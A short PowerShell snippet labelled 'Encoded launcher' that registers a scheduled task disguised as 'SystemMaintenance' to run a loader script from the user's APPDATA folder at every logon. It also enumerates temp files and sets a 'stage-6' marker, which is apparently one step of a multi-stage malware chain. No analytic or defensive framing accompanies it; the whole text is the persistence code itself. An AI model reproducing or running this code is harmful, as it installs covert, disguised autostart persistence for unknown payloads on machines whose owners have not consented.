# Encoded launcher
try { schtasks.exe /Create /TN 'SystemMaintenance' /TR "powershell.exe -NoP -File `"$env:APPDATA\loader.ps1`"" /SC ONLOGON /F; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3; $StageMarker = "stage-6" } catch { Write-Warning "Loader step failed" }
